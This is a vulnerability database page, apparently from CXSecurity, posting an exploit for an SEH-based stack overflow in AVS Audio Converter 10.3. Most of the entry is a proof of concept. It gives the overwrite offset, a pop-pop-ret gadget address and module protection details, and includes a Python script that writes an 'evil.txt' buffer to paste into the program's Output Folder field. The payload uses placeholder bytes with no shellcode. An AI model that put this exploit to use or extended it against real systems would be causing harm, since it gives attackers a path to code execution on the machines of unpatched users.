---
title: AVS Audio Converter 10.3 Stack Overflow
url: https://cxsecurity.com/issue/WLB-2022100055
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-20
fetch_date: 2025-10-03T20:20:14.243781
---

# AVS Audio Converter 10.3 Stack Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AVS Audio Converter 10.3 Stack Overflow** **2022.10.19**  Credit:  **[Yehia Elghaly](https://cxsecurity.com/author/Yehia%2BElghaly/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: AVS Audio Converter 10.3 - Stack Overflow (SEH)
# Discovered by: Yehia Elghaly - Mrvar0x
# Discovered Date: 2022-10-16
# Tested Version: 10.3.1.633
# Tested on OS: Windows 7 Professional x86
#pop+ret Address=005154E6
#Message= 0x005154e6 : pop ecx # pop ebp # ret 0x04 | startnull {PAGE\_EXECUTE\_READ} [AVSAudioConverter.exe]
#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v10.3.1.633 (C:\Program Files\AVS4YOU\AVSAudioConverter\AVSAudioConverter.exe)
# The only module that has SafeSEH disabled.
# Base | Top | Rebase | SafeSEH | ASLR | NXCompat | OS Dll |
# 0x00400000 | 0x01003000 | False | False | False | False | False |
#Allocating 4-bytes for nSEH which should be placed directly before SEH which also takes up 4-bytes.
#Buffer = '\x41'\* 260
#nSEH = '\x42'\*4
#SEH = '\x43'\*4
#ESI = 'D\*44' # ESI Overwrite
#buffer = "A"\*260 + [nSEH] + [SEH] + "D"\*44
#buffer = "A"\*260 + "B"\*4 + "\xE6\x54\x51\x05" + "D"\*44
# Rexploit:
# Generate the 'evil.txt' payload using python 2.7.x on Linux.
# Open the file 'evil.txt' Copy.
# Paste at'Output Folder and click 'Browse'.
#!/usr/bin/python -w
filename="evil.txt"
buffer = "A"\*260 + "B"\*4 + "C"\*4 + "D"\*44
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100055)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top